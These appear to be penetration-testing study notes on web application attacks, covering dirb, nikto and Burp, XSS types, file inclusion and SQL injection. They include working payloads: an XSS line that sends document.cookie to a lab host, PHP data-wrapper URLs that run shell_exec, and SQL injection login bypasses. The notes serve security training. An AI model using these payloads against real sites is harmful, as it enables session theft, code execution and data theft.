# Web Application Attacks

## Web Application Enumeration

- Programming language and frameworks
- Web server software
- Database software
- Server operating system

## Web Application Assessment Tools

1. dirb

- `r` scan no-recursively
- `z` to add N millisecond delay to each request

```bash
dirb url -r -z 10
```

tips:
> DirBuster is a Java application similar to DIRB that offers multi-threading and a GUI-based interface.

2. BurpSuite

proxy tools

- Firefox: FoxyProxy
- Chrome: SwitchyOmega

3. Nikto

- `maxtime` scan time limit
- `T` tune the scan
- `host` host

```bash
nikto -host=url -maxtime=30s
```

## Exploiting Web-based Vulnerabilities

### 0x01. Exploiting Admin Console

1. dirb
2. burp suite

> dicts: https://github.com/danielmiessler/SecLists.git


### 0x02. Cross-Site Scripting (XSS)

#### a. basic

1. DOM

> DOM-based XSS attacks are similar to the other two types, but take place solely within the page’s Document Object Model (DOM).

2. Reflected(Persistent XSS)

> Reflected XSS attacks usually include the payload in a crafted request or link. The web application
takes this value and places it into the page content. This variant only attacks the person
submitting the request or viewing the link.

3. Stored

> occurs when the exploit payload is stored in a database or otherwise cached by a server

#### b. Identifying XSS Vulnerabilities

> < > ' " { } ;

>let’s describe the purpose of these special characters. HTML uses “<” and “>” to denote
elements,262 the various components that make up an HTML document. JavaScript uses “{” and
“}” in function declarations. Single (’) and double (") quotes are used to denote strings and
semicolons (;) are used to mark the end of a statement.

> If the application does not remove or encode these characters, it may be vulnerable to XSS as the
characters can be used to introduce code into the page.

#### c. Basic XSS

> <script>alert('XSS')</script>

#### d. Content Injection

> <iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>

apache log-file path: /var/log/apache2/access.log

#### e. Stealing Cookies and Session Information

> The Secure271 flag instructs the browser to only send the cookie over encrypted connections,
such as HTTPS. This protects the cookie from being sent in cleartext and captured over the
network.

> The HttpOnly272 flag instructs the browser to deny JavaScript access to the cookie. If this flag is
not set, we can use an XSS payload to steal the cookie

PHPSESSID

> <script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>

cookie-editor, firefox, https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/

#### f. Other XSS Attack Vectors

1. keystroke loggers
2. phishing attacks
3. port scanning
4. content scrapers/skimmers

BeEF, the Browser Exploitation Framework, that can leverage a simple XSS vulnerability to launch many different client-side attacks

### 0x03. directory traversal(path traversal vulnerabilities)

> allow us to read files of any type, including those outside the web root directory

### 0x04. File Inclusion Vulnerabilities

> file inclusion allow attacker to include a file into the application's running code

1. Local file inclusions(LFI)


2. Remote file inclusions(RFI)

> need allow_url_include = on

PHP:
    1. register_globals
    2. allow_url wrappers

tips:

> start a simple http server
```bash
python -m SimpleHTTPServer listen_port  # python 2.x
python -m http.server listen_port     # python 3.x
ruby -run -e httpd . -p listen_port   # ruby
busybox httpd -f -p listen_port       # busybox
```

*php wrappers*

```
http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
http://10.11.0.22/menu.php?file=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCJkaXIiKTsgPz4
```


### 0x05. SQL injection

1. authentication bypass

```sql
select * from users where name = 'tom' or 1=1;#' and password = 'jones'
select * from users where name = 'tom' or 1=1 LIMIT 1;#
```

2. Enumerating the Database

    a. column number enumeration

    ```sql
    select * from xxxx order by [num range test]
    ```

    b. Understanding the layout of the output

    ```sql
    select * from xxx union [all] select [1..column number]
    ```

    c. extracting data from the database

    ```sql
    select * from xxx union [all] select [1..column number with some information in ]
    
    @@version # db version
    user()  # current user
    table_name from information_schema.tables # enumerate database tables
    column_name from information_schema.columns where table_name='table_name'
    ```

    d. Code Execution

    - load_file:
    - into outfile

    ***tips*

    > 如果文件读写受限, 需要设置 secure_file_priv=''

3. Automating SQL Injection

    a. sqlmap

   ```bash
   sqlmap -u url -p param
   ```
   